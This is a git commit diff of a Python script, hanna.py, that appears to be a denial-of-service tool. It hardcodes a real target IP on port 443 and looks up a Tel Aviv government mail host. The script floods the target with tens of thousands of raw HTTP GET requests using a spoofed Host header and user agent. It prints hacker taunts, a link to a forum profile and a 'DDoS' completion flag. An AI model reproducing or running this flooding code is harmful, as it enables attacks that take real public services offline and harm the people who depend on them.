d485fdd8ee9140cdc6d7d04681a2e31059fa369c
kwafelt <112316378+kwafelt@users.noreply.github.com>
2022-10-04 12:42:07 +0800

    Update hanna.py

--- hanna.py
+++ hanna.py
@@ -1,26 +1,11 @@
 #!/usr/bin/env python3
 #
 import datetime, os, platform, socket, sys, uuid
-import hashlib, json, requests, threading
+import hashlib, json, requests, time #threading
 from threading import Timer
-import time
-# RAW
-
-hil = """
-GET / HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: python-requests/2.22.0
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
->> Host, User-Agent, Accept, Accept-Encoding, Connection
-
-num = send(s, addr_of_data, len_of_data, 0);
-num = recv(s, addr_of_buffer, len_of_buffer, 0);
-Content-Type: text/plain
-"""
+#
 hello = """
-                                                                      
+                                                                  
         .uef^"                                                        
       :d88E                      u.    u.      u.    u.               
       `888E             u      x@88k u@88c.  x@88k u@88c.       u     
@@ -34,60 +19,49 @@ hello = """
        `Y"   888   ^Y"   ^Y'                               ^Y"   ^Y'  
             J88"                                                      
             @%                                                        
-          :"                                                          
+          :"
+          
 """
-workstation = "Hanna Sofea's comrade";
 w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
 w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
 w3 = '\thttps://www.instagram.com/kwafelt/?'
 
-Browser_identification = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.80';
-user_agent = Browser_identification; ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)';
+Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80';
+ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)';
+user_agent = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
 
-localhost =  socket.gethostname(); address = socket.gethostbyname(localhost);
-hostname = os.uname()[0]; username = os.environ.get('USERNAME');
-admin = os.getlogin(); MAC = hex(uuid.getnode());
-deact = 'writ.er.ws'; slEEp = 0.75;
+station = socket.gethostname(); address = socket.gethostbyname(station);
+hostnme = os.uname()[0]; usernme = os.environ.get('USERNAME');
+admin = os.getlogin(); admin = str(admin).replace('K','k').replace('l','L');
+MAC = hex(uuid.getnode()); proxy = 'search.censys.io'; slEEp = 0.75;
+#
 
+def dev():
+ data = 'mail.tel-aviv.gov.il'
+ print(socket.gethostbyname(data))
+
+TARGET_IP = '80.179.151.134'; TARGET_PORT = 443; status = 'dorman';
+#
+workstation = "Hanna Sofea's comrade"; v4L = f'{admin} wAS hERE';
+inject = 'Injecting process'; question = 'Do you want to continue ?';
+confirm = 'Is this ok?';
 # parse_input
-script = sys.argv[0]; txt = None;
-target = None; port = None; num_requests = 0;
-
-
-thread_num = 0
-# OK
-
-
+script = sys.argv[0]; target = None; port = None;
+txt1 = None; num_requests = 0; thread_num = 0;
 # scratch.py
 #
-REMOTE_SERVER = 'cloudflare.com'; remote = REMOTE_SERVER; STATE = True
-TARGET_IP = '80.179.151.134'; TARGET_PORT = 443; status = 'mill'
-# pAUSE
-
-def test():
- s = "Hello World"
- s = s.replace("world","Universe")
- print(s)
-
-def colored(r,g,b,text):
- return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);
+def client(init): # platform
+ client_os = platform.system(); un = platform.uname();
+ client_hn = platform.node(); # hostname
+ if (init == 'os'): return client_os;
+ if (init == 'hn'): return client_hn;
 
 def rgb(r,g,b,text):
  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);
 
-def client(init): # platform
- client_os = platform.system(); un = platform.uname();
- client_hn = platform.node(); # hostname
- if init == 'os': return client_os;
- if init == 'hn': return client_hn;
-
-b4L = 'process'; v4L = 'kwafeLt wAS hERE';
-question = 'Do you want to continue?';
-confirm = 'Is this ok?';
-
-def terminal(init):
- if init == 'start': terminal_title = workstation + ' \ ' + v4L
- if init == 'process': terminal_title = 'Injecting process \ ' + target + ': ' + str(port) + ' \ ' + v4L
+def cli(init):
+ if init == 'start': terminal_title = f'{workstation} \ {v4L}';
+ if init == 'prcss': terminal_title = f'{inject} \ {target}:{port} \ {v4L}';
  print(f'\33]0;{terminal_title}\a',end='',flush=True);
 
 def h4sh(txt):
@@ -104,8 +78,6 @@ def address(LAN):
   wifi.connect((remote_server,80)) # 443
   addr = wifi.getsockname()[0]
  return addr
-
-
 ###############################################################################
 
 def t1m3r(init): Timer(init,parse).start();
@@ -129,25 +101,39 @@ def verif(init):
   r = socket.gethostbyname(target); s = socket.create_connection((r, port), 2);
   start(init);
  except (IOError, OSError):
-  txt = 'SYSTEM LOCKDOWN / SERVER OFFLINE';
+  txt = rgb(245,45,45,'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
   sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush(); sys.exit(0);
+
+def ipapi(i):
+ if (i == 0): URL = f'http://ip-api.com/json/'; #EDT https://ipinfo.io/json/1.1.1.1
+ else: URL = f'http://ip-api.com/json/{target}';
+ response = requests.get(URL); txt = json.loads(response.text); 
+ tx1 = f"{rgb(245,245,245,txt['country'])} {rgb(227,10,92,txt['regionName'])} {rgb(0,110,210,txt['city'])} {rgb(245,245,245,txt['zip'])}";
+ tx2 = f"\r\n {rgb(227,10,92,txt['isp'])}\n {rgb(0,110,210,txt['query'])}"
+ out = tx1 + tx2
+ return out
+
 def start(init):
- terminal('start'); os.system('setterm --foreground black --background white --cursor on')
- os.system('clear'); print(hello); access_code('\taccess code');
-def access_code(key):
- reply = input('\n ' + key + '\t:\t');
+ os.system('setterm --foreground white --background red --cursor on');
+ os.system('clear'); cli('start'); print(hello); accss('\taccess code');
+def accss(text):
+ reply = input('\n ' + text + '\t:\t');
  if reply == '2022':
   os.system('setterm --foreground cyan --background black --cursor on'); os.system('clear');
-  print('\n',colored(245,110,110,admin),colored(245,245,245,client('hn')),colored(245,110,110,MAC),colored(245,245,245,client('os')),end=' ');
-  print(colored(0,110,210,platform.release()),'\n',colored(205,163,152,'wanna/will inject process to'),colored(245,110,110,target + ' : ' + str(port)),end='\n');
+  tx1 = rgb(245,110,110,admin); tx2 = rgb(245,245,245,station); tx3 = rgb(245,110,110,MAC);
+  tx4 = rgb(245,245,245,client('os')); tx5 = rgb(0,110,210,platform.release());
+  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n'); sys.stdout.flush();
   
-  ipinfo()
+  sys.stdout.write(f'\r\n {ipapi(0)}\r\n'); sys.stdout.flush();
+  txthere = rgb(245,215,0,f'wanna/will inject process to {target} : {port}')
+  sys.stdout.write(f'\r\n {txthere}\r\n'); sys.stdout.flush();
+  sys.stdout.write(f'\r\n {ipapi(1)}\r\n'); sys.stdout.flush();
   
   yes_or_no(question);
  else:
-  access_code('\ttry again');
+  accss('\ttry again');
 def yes_or_no(question):
- reply = input('\n ' + question + ' [y/N] ');
+ reply = input(f'\r\n {rgb(0,245,0,question)} [y/N] ');
  if reply == '' or reply[0] == 'n':
   global txt; txt = 'CANCEL'; reset(0); os.system('clear'); return False;
  if reply[0] == 'y': press(0); return False;
@@ -158,25 +144,9 @@ def yes_or_no_ORIG(question): # BROKEN
  if reply[0] == 'n': return False
  else: return yes_or_no("Uhhhh... please enter ");
 def press(init):
- tx1 = datetim4(0); os.system('setterm --cursor off'); os.system('clear');
- tx2 = 'Injecting process..'; terminal('process');
- st = print_status(); st.initial(tx1,tx2); process(24500);
-
-###############################################################################
-
-def ipinfo():
- uRL_ORI = 'https://ipinfo.io/json/1.1.1.1'
- uRL = 'http://ip-api.com/json/' + target
- response = requests.get(uRL)
- txt_resp = json.loads(response.text)
- # EDIT
-# str1 = colored(210,110,0,txt_resp['ip'])
-# str2 = colored(0,110,210,txt_resp['region'])
-# str3 = colored(0,110,210,txt_resp['loc'])
-# str4 = colored(205,163,152,txt_resp['org'])
-# print('\n','IP',str1,'from',str2,'(' + str3 + ')','\n',str4)
- 
- print(f'\n',txt_resp)
+ os.system('setterm --cursor off'); os.system('clear'); cli('prcss');
+ tx1 = datetim4(0); tx2 = f'{inject}..'; pst = print_status();
+ pst.initial(tx1,tx2); process(15400);
 
 ###############################################################################
 
@@ -196,23 +166,19 @@ def datetim4(init):
 
 class print_status():
  def initial(self, time, txt1):
-  tx1 = rgb(245,245,245,time); tx2 = rgb(255,215,0,txt1);
-  sys.stdout.write(f'\r {tx1} {tx2}\r'); sys.stdout.flush();
+  tx1 = rgb(245,215,0,time); tx2 = rgb(99,99,99,'Initial');
+  tx3 = rgb(255,215,0,txt1);
+  sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r'); sys.stdout.flush();
  def success(self, time, txt1):
-  tx1 = rgb(205, 163, 152, time);
-  tx2 = rgb(45 , 145, 145, 'Success');
-  tx3 = rgb(245, 110,  45, txt1);
-  tx4 = rgb(245, 245, 245, v4L);
+  tx1 = rgb(245,145,145,time); tx2 = rgb(0,110,210,'Success');
+  tx3 = rgb(227,10,92,txt1); tx4 = rgb(245,245,245,v4L);
   sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
  def timeout(self, time, txt1):
-  tx1 = rgb(245,245,245,time);
-  tx2 = rgb(255,215,0,'Timeout');
-  tx3 = '> ERR_CONNECTION_TIMEOUT_ERR';
-  tx4 = rgb(0,110,210,'< RECONNECTING');
+  tx1 = rgb(245,245,245,time); tx2 = rgb(255,215,0,'Timeout');
+  tx3 = '> ERR_CONNECTION_TIMEOUT_ERR'; tx4 = rgb(0,110,210,'< RECONNECTING');
   sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
  def failure(self, time, txt1):
-  tx1 = rgb(145, 145, 145, time);
-  tx2 = rgb(245, 110, 110, 'Failure');
+  tx1 = rgb(145, 145, 145, time); tx2 = rgb(245, 110, 110, 'Failure');
   tx3 = rgb(255, 215, 0, 'No connection > server may be down');
   tx4 = rgb(245 , 245, 245, '< RECONNECTING');
   sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
@@ -236,18 +202,17 @@ class att4ck():
 
 
 
-def attack():
+def attack(init):
  global slEEp; time.sleep(slEEp); time1 = datetim4(0); time2 = datetim4(1); hexd = h4sh(time2);
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
   try:
    address = (target, port); proc.connect(address); proc.settimeout(0.75);#saat
-   proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {deact}\r\n').encode('ascii'), address);
+   proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {proxy}\r\n').encode('ascii'), address);
    proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
    proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
    proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
    #
-   #response = proc.recv(256); # 4096 #print('\r\n' + response.decode('ascii'))
-   # num = send(s, addr_of_data, len_of_data, 0);
+   if (init == 'debug'): response = proc.recv(4096); print(f'\r\n' + response.decode('ascii'))
    # num = recv(s, addr_of_buffer, len_of_buffer, 0);
    #
    proc.shutdown(socket.SHUT_RDWR); proc.close();
@@ -261,23 +226,24 @@ def attack():
  return slEEp;
 
 def process(i):
- while (i < 54000):
+ while (i < 54001):
   i += 1
   if (i == 54000):
-   time.sleep(1.0); flag = 'CTF{5h371x1}';
+   time.sleep(1.0); flag = 'DDoS{5h371x1}';
    tx1 = rgb(245,245,245,f'COMPLETED / ETA {i} / {flag} / FINN');
    sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); break
   else:
-   try: attack(); #Timer(slEEp,attack).start();
+   try: attack(0); #Timer(slEEp,attack).start();
    except (KeyboardInterrupt, SystemExit):
-    tx1 = rgb(245,245,245,'KEYBOARD INTERRUPT / CTRL-C / PRESSED / PAUSED');
+    tx1 = rgb(245,245,245,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT');
     sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); sys.exit(0);
    finally: pass;
 
-def process_B():
+def process_b(i):
  for i in range(500):# 500
   time.sleep(slEEp); thread = threading.Thread(target=attack);
   thread.start(); # ..D.O.R.M.A.N..
+ #else: print(f'\r\nD.O.R.M.A.N.\n')
 ###############################################################################
 try: parse(0); txt = None;
 except (KeyboardInterrupt, IOError, OSError):
